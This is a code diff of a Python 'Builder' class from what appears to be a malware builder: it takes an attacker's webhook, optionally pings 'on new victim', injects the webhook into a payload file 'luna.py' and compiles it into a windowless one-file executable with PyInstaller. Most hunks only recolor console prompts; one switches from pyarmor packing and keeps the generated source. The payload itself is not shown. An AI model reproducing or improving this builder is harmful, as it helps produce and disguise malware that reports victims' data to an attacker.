@@ -18,24 +18,24 @@ class Builder:
             exit()
 
         self.webhook = input(
-            f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your webhook: ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
         if not self.check_webhook(self.webhook):
             print(
-                f"{Fore.MAGENTA}[+]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
+                f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
             str(input(
-                f"{Fore.MAGENTA}[+]{Fore.RESET} Press anything to exit..."))
+                f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit..."))
             sys.exit()
 
         self.filename = input(
-            f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your filename: ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your filename: ')
         self.ping = input(
-            f'{Fore.MAGENTA}[+]{Fore.RESET} Ping on new victim? (y/n): ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping on new victim? (y/n): ')
 
         if self.ping.lower() == 'y':
             self.ping = True
 
             self.pingtype = input(
-                f'{Fore.MAGENTA}[+]{Fore.RESET} Ping type (here/everyone): ').lower()
+                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type (here/everyone): ').lower()
             if self.pingtype not in ["here", "everyone"]:
                 # default to @here if invalid ping type.
                 self.pingtype == "here"
@@ -45,14 +45,14 @@ class Builder:
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Built!')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Built!')
 
         run = input(
-            f'\n\n\n{Fore.MAGENTA}[+]{Fore.RESET} Do you want to test run the file? [y/n]: ')
+            f'\n\n\n{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test run the file? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
 
-        input(f'{Fore.MAGENTA}[+]{Fore.RESET} Press enter to exit...')
+        input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press enter to exit...')
 
     def loading(self):
         p = Fore.MAGENTA + Style.DIM
@@ -162,7 +162,7 @@ class Builder:
         return True
 
     def mk_file(self, filename, webhook):
-        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Generating source code...')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Generating source code...')
 
         with open('./luna.py', 'r', encoding="utf-8") as f:
             code = f.read()
@@ -175,34 +175,34 @@ class Builder:
         self.compile(filename)
 
     def compile(self, filename):
-        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Compiling code...')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Compiling code...')
         
         os.system(
-            f'pyarmor pack --clean -e "--onefile " {filename}.py')
+            f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
             
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}
+        cleans_file = {f'./{filename}.spec'}
 
         for clean in cleans_dir:
             try:
                 if os.path.isdir(clean):
                     shutil.rmtree(clean)
-                    print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
+                    print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {clean} removed!')
             except Exception:
-                print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
+                print(f'{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} {clean} not found!')
                 continue
 
         for clean in cleans_file:
             try:
                 if os.path.isfile(clean):
                     os.remove(clean)
-                    print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
+                    print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {clean} removed!')
             except Exception:
                 print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                 continue
 
     def run(self, filename):
-        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Attempting to execute file...')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Attempting to execute file...')
 
         if os.path.isfile(f'./{filename}.exe'):
             os.system(f'start ./{filename}.exe')
